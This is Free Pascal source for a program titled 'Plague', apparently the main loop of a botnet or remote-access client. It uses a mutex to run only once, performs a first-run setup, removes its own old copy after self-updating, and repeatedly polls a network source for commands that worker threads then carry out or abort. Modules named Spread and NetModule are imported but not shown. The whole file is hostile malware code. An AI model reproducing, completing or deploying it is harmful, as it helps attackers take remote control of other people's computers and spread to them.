program Plague;

{$mode objfpc}{$H+}

uses
  NetModule, Tools, Spread,
  Classes, Windows, SysUtils, CmdWorker;

var
  J, I: LongInt;
  CmdID, ToAbort: String;

{$R *.res}

Begin
  SetLastError(0);
  if ParamStr(1)='/open' then ShellExecute(0, 'open', 'explorer.exe',
    PChar(ParamStr(2)), nil, SW_NORMAL);
  LoadSettings;
  Initialize;
  if ParamStr(1)='/wait' then Sleep(Delay+200);
  if ParamStr(2)='/removeold' then
    if FileExists(ParamStr(0)+'.old') then DeleteFile(ParamStr(0)+'.old');
  if Settings.ReadInteger('General', 'FirstRun', 1) = 1 then DoFirstRun;
  MutexMagic;
  if DirectoryExists(Base) then ChDir(Base);

  Net:=TNet.Create(Nil);
  Repeat
    try
    Net.GetCommands;
    Writeln('Commands - ', Net.CommandCount);
    For J:=1 to Net.CommandCount do Begin
      CmdID:=Net.GetCommandID(J);
      //Check if it is an Abort command
      if Net.Commands.ReadString(CmdID, 'Type', '')='Abort' then Begin
        ToAbort:=Net.Commands.ReadString(CmdID, 'CommandID', '');
        I:=ExecIndex(ToAbort);
        if I>-1 then Begin
          Writeln('ABORT: Thread #',I);
          Workers[I].Abort(CmdID);
        end else Writeln('ABORT: Thread not found!');
      end else Begin
        //Check if commands are already under execution
        I:=ExecIndex(CmdID);
        if I=-1 then Begin
          I:=FindAPlace;
          Writeln('Command ',Net.Commands.ReadString(CmdID, 'Type', '???'),
          ' --> Worker #'+IntToStr(I)+'.');
          Workers[I]:=TCmdWorker.Create(CmdID, I);
        end;
      end;
    end;
    //Readln;
    Sleep(Delay);
    except on E: Exception do Writeln('Fatal Exception: '+E.Message);
    end;
  until Not(AllowExecution);
  For J:=1 to High(Workers) do
  if Assigned(Workers[J]) then Begin
    Workers[J].Destroy;
  end;
  SetLength(Workers, 0);
  Net.Free;
  CloseHandle(Mutex);
end.
